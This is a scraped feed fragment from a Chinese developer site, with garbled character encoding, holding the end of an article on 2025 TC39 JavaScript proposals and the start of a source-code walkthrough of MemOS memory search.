<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> userInput = <span class="hljs-string">"user@example.com (admin)"</span>;
<span class="hljs-keyword">const</span> safePattern = <span class="hljs-title class_">RegExp</span>.<span class="hljs-built_in">escape</span>(userInput);
<span class="hljs-keyword">const</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(safePattern);
<span class="hljs-comment">// ä¸ç”¨æ‹…å¿ƒæ‹¬å·è¢«è§£ææˆåˆ†ç»„äº†</span>
</code></pre>
<p>è¿™ä¸ªéœ€æ±‚å¤ªå¸¸è§äº†ï¼Œä»¥å‰éƒ½å¾—è‡ªå·±å†™è½¬ä¹‰å‡½æ•°æˆ–è€…ç”¨ç¬¬ä¸‰æ–¹åº“ã€‚</p>
<h4 data-id="heading-16">Float16Arrayï¼ˆ2 æœˆï¼‰</h4>
<p>åŠç²¾åº¦æµ®ç‚¹æ•°çš„ TypedArrayï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> f16Array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float16Array</span>([<span class="hljs-number">1.5</span>, <span class="hljs-number">2.7</span>, <span class="hljs-number">3.1</span>]);
</code></pre>
<p>ä¸»è¦é¢å‘æœºå™¨å­¦ä¹ å’Œå›¾å½¢å¤„ç†åœºæ™¯ã€‚æ¨¡å‹æƒé‡ç»å¸¸ç”¨ fp16 å­˜å‚¨ï¼Œæœ‰äº†åŸç”Ÿæ”¯æŒå°±ä¸ç”¨è‡ªå·±åšè½¬æ¢äº†ã€‚</p>
<h4 data-id="heading-17">Error.isErrorï¼ˆ5 æœˆï¼‰</h4>
<p>å¯é åœ°åˆ¤æ–­ä¸€ä¸ªå€¼æ˜¯ä¸æ˜¯ Errorï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-title class_">Error</span>.<span class="hljs-title function_">isError</span>(value)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value.<span class="hljs-property">message</span>);
}
</code></pre>
<p>ä¸ºä»€ä¹ˆä¸ç”¨ <code>instanceof Error</code>ï¼Ÿå› ä¸ºè·¨ realmï¼ˆæ¯”å¦‚ iframe æˆ– Node.js çš„ vm æ¨¡å—ï¼‰çš„ Error å®ä¾‹ä¼šè¢«åˆ¤æˆ falseã€‚è¿™ä¸ªæ–¹æ³•è§£å†³äº†è¿™ä¸ªå†å²é—®é¢˜ã€‚</p>
<h4 data-id="heading-18">Math.sumPreciseï¼ˆ7 æœˆï¼‰</h4>
<p>é«˜ç²¾åº¦æ±‚å’Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sum = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sumPrecise</span>([<span class="hljs-number">0.1</span>, <span class="hljs-number">0.2</span>, <span class="hljs-number">0.3</span>]);
<span class="hljs-comment">// æ¯”æ™®é€šç´¯åŠ æ›´ç²¾ç¡®ï¼Œå‡å°‘æµ®ç‚¹è¯¯å·®ç´¯ç§¯</span>
</code></pre>
<p>åšé‡‘èè®¡ç®—æˆ–ç§‘å­¦è®¡ç®—çš„åº”è¯¥ä¼šå–œæ¬¢è¿™ä¸ªã€‚</p>
<h4 data-id="heading-19">Uint8Array Base64 ç¼–è§£ç ï¼ˆ7 æœˆï¼‰</h4>
<p>åŸç”Ÿçš„ Base64 ç¼–è§£ç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> bytes = <span class="hljs-title class_">Uint8Array</span>.<span class="hljs-title function_">fromBase64</span>(<span class="hljs-string">'SGVsbG8='</span>);
<span class="hljs-keyword">const</span> base64 = bytes.<span class="hljs-title function_">toBase64</span>();
<span class="hljs-comment">// è¿˜æœ‰ fromHex() å’Œ toHex()</span>
</code></pre>
<p>ç»ˆäºä¸ç”¨ä¸ºäº† Base64 è½¬æ¢å»æ‰¾ç¬¬ä¸‰æ–¹åº“äº†ã€‚</p>
<h4 data-id="heading-20">Explicit Resource Managementï¼ˆå·² Stage 4ï¼‰</h4>
<p><code>using</code> å…³é”®å­—ï¼Œè‡ªåŠ¨èµ„æºæ¸…ç†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">using file = <span class="hljs-keyword">await</span> <span class="hljs-title function_">openFile</span>(<span class="hljs-string">'data.txt'</span>);
<span class="hljs-comment">// ç¦»å¼€ä½œç”¨åŸŸè‡ªåŠ¨å…³é—­ï¼Œä¸ç”¨æ‰‹åŠ¨ finally</span>
</code></pre>
<p>å€Ÿé‰´äº† Python çš„ with å’Œ C# çš„ usingï¼Œè§£å†³äº† JS é‡Œèµ„æºç®¡ç†ä¸€ç›´å¾ˆæ··ä¹±çš„é—®é¢˜ã€‚</p>
<h3 data-id="heading-21">è¿˜æœ‰å‡ ä¸ªå€¼å¾—å…³æ³¨çš„ Stage 2 ææ¡ˆ</h3>
<h4 data-id="heading-22">Seeded PRNGï¼ˆ5 æœˆè¿›å…¥ Stage 2ï¼‰</h4>
<p>å¯ç§å­åŒ–çš„éšæœºæ•°ç”Ÿæˆå™¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> random = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>(<span class="hljs-number">12345</span>); <span class="hljs-comment">// ç§å­</span>
<span class="hljs-keyword">const</span> value = random.<span class="hljs-title function_">next</span>();
<span class="hljs-comment">// åŒæ ·çš„ç§å­ï¼ŒåŒæ ·çš„åºåˆ—</span>
</code></pre>
<p>æ¸¸æˆå¼€å‘ã€æµ‹è¯•ã€ä»¿çœŸè¿™äº›åœºæ™¯ç»å¸¸éœ€è¦å¯é‡ç°çš„éšæœºåºåˆ—ã€‚</p>
<h4 data-id="heading-23">Error Stack Accessorï¼ˆ5 æœˆè¿›å…¥ Stage 2ï¼‰</h4>
<p>æ ‡å‡†åŒ–é”™è¯¯å †æ ˆçš„è®¿é—®æ–¹å¼ã€‚ç°åœ¨å„ä¸ªå¼•æ“çš„ <code>error.stack</code> æ ¼å¼éƒ½ä¸ä¸€æ ·ï¼Œè¿™ä¸ªææ¡ˆè¦ç»Ÿä¸€å®ƒã€‚</p>
<h3 data-id="heading-24">ææ¡ˆæµç¨‹ç®€å•å›é¡¾</h3>
<p>TC39 çš„ææ¡ˆåˆ† 5 ä¸ªé˜¶æ®µï¼š</p>
<ul>
<li><strong>Stage 0</strong>ï¼šæƒ³æ³•</li>
<li><strong>Stage 1</strong>ï¼šæ­£å¼ææ¡ˆï¼Œå¼€å§‹è®¨è®º</li>
<li><strong>Stage 2</strong>ï¼šè§„èŒƒè‰æ¡ˆï¼ŒAPI åŸºæœ¬ç¨³å®š</li>
<li><strong>Stage 2.7</strong>ï¼šè§„èŒƒæ–‡æœ¬æ¥è¿‘å®Œæˆï¼Œå‡†å¤‡å†™æµ‹è¯•</li>
<li><strong>Stage 3</strong>ï¼šç­‰å¾…å®ç°åé¦ˆ</li>
<li><strong>Stage 4</strong>ï¼šæ­£å¼çº³å…¥æ ‡å‡†</li>
</ul>
<p>Import Bytes å’Œ Iterator Chunking éƒ½åˆ°äº† Stage 2.7ï¼Œç¦» Stage 3 å°±å·® test262 æµ‹è¯•å’Œæµè§ˆå™¨å®ç°æ‰¿è¯ºäº†ã€‚</p>
<h3 data-id="heading-25">æ€»ç»“</h3>
<p>2025 å¹´ TC39 çš„è¿›å±•è¿˜æ˜¯æŒºç»™åŠ›çš„ï¼š</p>
<ul>
<li><strong>Import Bytes</strong> è§£å†³äº†è·¨å¹³å°äºŒè¿›åˆ¶å¯¼å…¥çš„è€å¤§éš¾é—®é¢˜ï¼ŒåŒæ„åº“å¼€å‘ç»ˆäºèƒ½çœå¿ƒäº†</li>
<li><strong>Iterator Chunking</strong> è¡¥ä¸Šäº†è¿­ä»£å™¨å·¥å…·é“¾çš„ç©ºç™½ï¼Œchunks å’Œ windows è¦†ç›–äº†å¤§éƒ¨åˆ†åˆ†å—åœºæ™¯</li>
<li><strong>ä¸€å †ç‰¹æ€§è¿›å…¥ Stage 4</strong>ï¼šRegExp.escapeã€Float16Arrayã€Math.sumPreciseã€Base64 ç¼–è§£ç ã€èµ„æºç®¡ç†...</li>
</ul>
<p>è¿™äº›ç‰¹æ€§æœ‰çš„å·²ç»å¯ä»¥é€šè¿‡ Babel æˆ– TypeScript æå‰å°é²œäº†ã€‚å¦‚æœä½ åœ¨ç”¨ Deno æˆ– Bunï¼ŒImport Bytes ç±»ä¼¼çš„åŠŸèƒ½ç°åœ¨å°±èƒ½ç”¨ã€‚</p>
<hr/>
<p><strong>é¡ºæ‰‹å®‰åˆ©å‡ ä¸ªæˆ‘çš„å¼€æºé¡¹ç›®ï¼š</strong></p>
<p><strong>Claude Code Skills</strong>ï¼ˆæŒ‰éœ€åŠ è½½ï¼Œæ„å›¾è‡ªåŠ¨è¯†åˆ«ï¼Œä¸æµªè´¹ tokenï¼Œ<a href="https://juejin.cn/post/7578714735307735066" target="_blank" title="https://juejin.cn/post/7578714735307735066">ä»‹ç»æ–‡ç« </a>ï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> - ä»£ç å®¡æŸ¥æŠ€èƒ½ï¼Œè¦†ç›– React 19ã€Vue 3ã€TypeScriptã€Rust ç­‰çº¦ 9000 è¡Œè§„åˆ™ï¼ˆ<a href="https://juejin.cn/post/7578709098255908902" target="_blank" title="https://juejin.cn/post/7578709098255908902">è¯¦ç»†ä»‹ç»</a>ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2F5-whys-skill" target="_blank" title="https://github.com/tt-a1i/5-whys-skill" ref="nofollow noopener noreferrer">5-whys-skill</a> - 5 Whys æ ¹å› åˆ†æï¼Œè¯´"æ‰¾æ ¹å› "è‡ªåŠ¨æ¿€æ´»</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Ffirst-principles-skill" target="_blank" title="https://github.com/tt-a1i/first-principles-skill" ref="nofollow noopener noreferrer">first-principles-skill</a> - ç¬¬ä¸€æ€§åŸç†æ€è€ƒï¼Œé€‚åˆæ¶æ„è®¾è®¡å’ŒæŠ€æœ¯é€‰å‹</li>
</ul>
<p><strong>å…¨æ ˆé¡¹ç›®</strong>ï¼ˆé€‚åˆå­¦ä¹ ç°ä»£æŠ€æœ¯æ ˆï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fprompt-vault" target="_blank" title="https://github.com/tt-a1i/prompt-vault" ref="nofollow noopener noreferrer">prompt-vault</a> - Prompt ç®¡ç†å™¨ï¼Œç”¨çš„éƒ½æ˜¯æœ€æ–°çš„æŠ€æœ¯æ ˆï¼Œé€‚åˆç”¨æ¥å­¦ä¹ äº†è§£æœ€æ–°çš„å‰ç«¯å…¨æ ˆå¼€å‘èŒƒå¼ï¼šNext.js 15 + React 19 + tRPC 11 + Supabase å…¨æ ˆç¤ºä¾‹ï¼Œclone ä¸‹æ¥é…ä¸ªå…è´¹ Supabase å°±èƒ½è·‘</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a> - åŒæ¨¡å¼ AI åº”ç”¨ï¼ˆèŠå¤©+å¯Œæ–‡æœ¬ç¼–è¾‘ï¼‰ï¼ŒVue 3.5 + TypeScript + Vite 5 + Quill 2.0 + IndexedDB</li>
</ul>
<hr/>
<h3 data-id="heading-26">å‚è€ƒé“¾æ¥</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftc39%2Fproposals" target="_blank" title="https://github.com/tc39/proposals" ref="nofollow noopener noreferrer">TC39 Proposals Repository</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftc39%2Fproposal-import-bytes" target="_blank" title="https://github.com/tc39/proposal-import-bytes" ref="nofollow noopener noreferrer">Import Bytes Proposal</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftc39.es%2Fproposal-iterator-chunking%2F" target="_blank" title="https://tc39.es/proposal-iterator-chunking/" ref="nofollow noopener noreferrer">Iterator Chunking Specification</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblogs.igalia.com%2Fcompilers%2F2025%2F03%2F27%2Fsummary-of-the-february-2025-tc39-plenary%2F" target="_blank" title="https://blogs.igalia.com/compilers/2025/03/27/summary-of-the-february-2025-tc39-plenary/" ref="nofollow noopener noreferrer">February 2025 TC39 Meeting Summary</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblogs.igalia.com%2Fcompilers%2F2025%2F07%2F03%2Fsummary-of-the-may-2025-tc39-plenary%2F" target="_blank" title="https://blogs.igalia.com/compilers/2025/07/03/summary-of-the-may-2025-tc39-plenary/" ref="nofollow noopener noreferrer">May 2025 TC39 Meeting Summary</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.infoq.com%2Fnews%2F2025%2F06%2Ftc39-stage-4-2025%2F" target="_blank" title="https://www.infoq.com/news/2025/06/tc39-stage-4-2025/" ref="nofollow noopener noreferrer">TC39 Stage 4 Proposals 2025</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Agentã€‘MemOS æºç ç¬”è®°---(3)---æœç´¢]]></title>    <link>https://juejin.cn/post/7581312433529733163</link>    <guid>https://juejin.cn/post/7581312433529733163</guid>    <pubDate>2025-12-08T12:31:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581312433529733163" data-draft-id="7577647745110425600" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Agentã€‘MemOS æºç ç¬”è®°---(3)---æœç´¢"/> <meta itemprop="keywords" content="ç®—æ³•,æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-08T12:31:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç½—è¥¿çš„æ€è€ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/351470467691175"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Agentã€‘MemOS æºç ç¬”è®°---(3)---æœç´¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/351470467691175/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç½—è¥¿çš„æ€è€ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T12:31:41.000Z" title="Mon Dec 08 2025 12:31:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»19åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ã€Agentã€‘MemOS æºç ç¬”è®°---(3)---æœç´¢</h2>
<h3 data-id="heading-1">0x00 æ‘˜è¦</h3>
<p>TreeTextMemory æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„è®°å¿†ç®¡ç†ç³»ç»Ÿï¼Œèƒ½å­˜å‚¨ã€ç»„ç»‡ã€æ£€ç´¢å’Œç»´æŠ¤å„ç§ç±»å‹çš„æ–‡æœ¬è®°å¿†ã€é€‚ç”¨éœ€è¦å¤æ‚è®°å¿†ç®¡ç†çš„AIç³»ç»Ÿã€‚è¿™æ˜¯ä¸€ä¸ªåŸºäºå›¾çš„ã€æ ‘å½¢æ˜æ–‡è®°å¿†ï¼Œæ”¯æŒä»¥ç»“æ„åŒ–æ–¹å¼ç»„ç»‡ã€å…³è”å¹¶æ£€ç´¢è®°å¿†ï¼ŒåŒæ—¶ä¿ç•™ä¸°å¯Œçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ä¸è‰¯å¥½çš„å¯è§£é‡Šæ€§ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªTreeTextMemory å¯¹è±¡ä¸åºå¤§çš„çŸ¥è¯†åº“è¿›è¡Œäº¤äº’ï¼Œä¸ºAIèµ‹äºˆä¸“ä¸šçš„é¢†åŸŸè®°å¿†ã€‚å½“å‰ä½¿ç”¨Neo4jä½œä¸ºåç«¯ï¼Œæœªæ¥è®¡åˆ’æ”¯æŒæ›´å¤šå›¾æ•°æ®åº“ã€‚</p>
<p>å› ä¸ºå­—æ•°å¤ªå¤šï¼Œå› æ­¤æŠŠTreeTextMemoryæ‹†åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸Šä¸€ç¯‡ä»‹ç»åŸºæœ¬æ¦‚å¿µå’Œå¦‚ä½•ç®¡ç†ï¼Œæœ¬ç¯‡ä»‹ç»å¦‚ä½•æœç´¢ã€‚</p>
<h3 data-id="heading-2">0x01 åˆ†ç±»</h3>
<p>TreeTextMemory ä¸»è¦æ”¯æŒå‡ ç§æœç´¢ï¼ˆæ³¨ï¼Œæœ‰äº›æ˜¯ä»å…¶ä»–é€”å¾„é€å‡ºï¼‰ï¼š</p>
<ul>
<li>
<p>æ··åˆæœç´¢ï¼ˆHybrid Searchï¼‰ï¼Œé€šè¿‡ Searcher.search æ–¹æ³•å¯¹å¤–æä¾›æœåŠ¡ï¼Œæ•´åˆå¤šç§æ£€ç´¢ç­–ç•¥çš„ç»“æœï¼Œå…·ä½“ç­–ç•¥å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç»“åˆå‘é‡ç›¸ä¼¼åº¦æœç´¢å’Œå›¾éå†ï¼šåœ¨ GraphMemoryRetrieverä¸­åˆ©ç”¨å›¾ç»“æ„å’Œå‘é‡ä¿¡æ¯</li>
<li>å…¨æ–‡æ£€ç´¢ï¼šè™½ç„¶æ²¡æœ‰æ˜¾å¼çš„å…¨æ–‡æœç´¢APIï¼Œä½†å¯ä»¥é€šè¿‡äº’è”ç½‘æ£€ç´¢å™¨ä»æœç´¢å¼•æ“è·å–ç›¸å…³å†…å®¹ InternetRetriever ç»„ä»¶å…è®¸é›†æˆå¤–éƒ¨æœç´¢æœåŠ¡ï¼ˆå¦‚Googleã€Bingã€Bochaï¼‰</li>
</ul>
</li>
<li>
<p>å­å›¾æ£€ç´¢ï¼ˆSubgraph Retrievalï¼‰ï¼Œé€šè¿‡ get_relevant_subgraph æ–¹æ³•å¯ä»¥ç›´æ¥è¿›è¡Œå­å›¾æœç´¢</p>
<ul>
<li>ä½¿ç”¨ graph_store.search_by_embedding æ–¹æ³•è·å–æŒ‡å®šèŠ‚ç‚¹å‘¨å›´çš„å±€éƒ¨å­å›¾ç»“æ„</li>
<li>æ”¯æŒè®¾ç½®éå†æ·±åº¦å’Œä¸­å¿ƒèŠ‚ç‚¹çŠ¶æ€æ¡ä»¶</li>
<li>è¿”å›åŒ…å«æ ¸å¿ƒèŠ‚ç‚¹ã€é‚»å±…èŠ‚ç‚¹å’Œè¾¹çš„å®Œæ•´å­å›¾ä¿¡æ¯</li>
</ul>
</li>
</ul>
<p>ä»¥ä¸‹æ˜¯å›¾æ•°æ®åº“çš„APIï¼Œæ¯”å¦‚ä½äºMemOS-main\src\memos\graph_dbs\nebular.pyä¸­ï¼Œåœ¨ä¸€äº›ç¤ºä¾‹ä¸­ä¹Ÿç›´æ¥ä½¿ç”¨ï¼š</p>
<ul>
<li>
<p>åŸºäºå…ƒæ•°æ®çš„ç»“æ„åŒ–æŸ¥è¯¢ï¼ˆMetadata-based Structured Queryï¼‰</p>
<ul>
<li>é€šè¿‡ get_by_metadataæ–¹æ³•æ ¹æ®èŠ‚ç‚¹å…ƒæ•°æ®å­—æ®µè¿›è¡Œç²¾ç¡®åŒ¹é…æˆ–æ¡ä»¶æŸ¥è¯¢</li>
<li>æ”¯æŒå¤šç§æ“ä½œç¬¦ï¼šç­‰äºï¼ˆ=ï¼‰ã€åŒ…å«ï¼ˆcontainsï¼‰ã€åœ¨åˆ—è¡¨ä¸­ï¼ˆinï¼‰ç­‰</li>
<li>å¯ä»¥ç»„åˆå¤šä¸ªæ¡ä»¶è¿›è¡Œå¤æ‚æŸ¥è¯¢</li>
</ul>
</li>
</ul>

<ul>
<li>
<p>æ ‡ç­¾é‡å æŸ¥è¯¢ï¼ˆTag Overlap Queryï¼‰</p>
<ul>
<li>ä½¿ç”¨ get_neighbors_by_tagæ–¹æ³•æŸ¥æ‰¾å…·æœ‰ç›¸ä¼¼æ ‡ç­¾çš„ç›¸é‚»èŠ‚ç‚¹</li>
<li>é€šè¿‡è®¡ç®—æ ‡ç­¾äº¤é›†å¤§å°æ¥ç¡®å®šç›¸å…³æ€§</li>
<li>æ”¯æŒè®¾ç½®æœ€å°æ ‡ç­¾é‡å æ•°è¦æ±‚</li>
</ul>
</li>
<li>
<p>å‘é‡ç›¸ä¼¼åº¦æœç´¢ï¼ˆVector Similarity Searchï¼‰</p>
<ul>
<li>åŸºäºåµŒå…¥ï¼ˆembeddingï¼‰çš„è¯­ä¹‰ç›¸ä¼¼åº¦æœç´¢</li>
<li>ä½¿ç”¨ search_by_embedding æ–¹æ³•æ ¹æ®æŸ¥è¯¢å‘é‡æ‰¾åˆ°æœ€ç›¸ä¼¼çš„è®°å¿†èŠ‚ç‚¹</li>
<li>æ”¯æŒè®¾ç½®ç›¸ä¼¼åº¦é˜ˆå€¼å’Œè¿”å›ç»“æœæ•°é‡é™åˆ¶</li>
</ul>
</li>
</ul>
<p>å…¶ä¸­æœ€ä¸»è¦çš„æŸ¥è¯¢æ¥å£æ˜¯ searchæ–¹æ³•ï¼Œå®ƒå†…éƒ¨æ•´åˆäº†å¤šç§æ£€ç´¢ç­–ç•¥æ¥æä¾›æœ€ä¼˜çš„æœç´¢ç»“æœã€‚</p>
<h3 data-id="heading-3">0x02 ## æ··åˆæœç´¢ï¼ˆHybrid Searchï¼‰--- Searcher</h3>
<p>Searcher ç”± TreeTextMemory åˆ›å»ºå¹¶ä½œä¸ºä¸»è¦çš„æœç´¢æ¥å£ä½¿ç”¨ï¼ŒSearcher æ˜¯æ•´ä¸ªè®°å¿†æ£€ç´¢ç³»ç»Ÿçš„æ ¸å¿ƒåè°ƒè€…ï¼Œè´Ÿè´£æ•´åˆå„ç§æ£€ç´¢æºå¹¶æä¾›é«˜è´¨é‡çš„æ£€ç´¢ç»“æœã€‚Searcher ç±»çš„ä¸»è¦åŠŸèƒ½æ˜¯æ‰§è¡Œè®°å¿†æ£€ç´¢ä»»åŠ¡ã€‚ä»¥ä¸‹æ˜¯å…¶æ ¸å¿ƒèŒè´£å’Œå·¥ä½œæµç¨‹ï¼š</p>
<ul>
<li>
<p>å¤šè·¯å¾„å¹¶è¡Œæ£€ç´¢ï¼ŒåŒæ—¶ä»å¤šä¸ªæ¥æºæ£€ç´¢ç›¸å…³ä¿¡æ¯ï¼š</p>
<ul>
<li>å·¥ä½œè®°å¿†ï¼ˆWorkingMemoryï¼‰</li>
<li>é•¿æœŸè®°å¿†ï¼ˆLongTermMemoryï¼‰</li>
<li>ç”¨æˆ·è®°å¿†ï¼ˆUserMemoryï¼‰</li>
<li>äº’è”ç½‘æ£€ç´¢å™¨ï¼ˆå¯é€‰ï¼‰</li>
<li>MemCubesï¼ˆå¯é€‰ï¼‰</li>
</ul>
</li>
<li>
<p>ä»»åŠ¡è§£æä¸æŸ¥è¯¢ä¼˜åŒ–</p>
<ul>
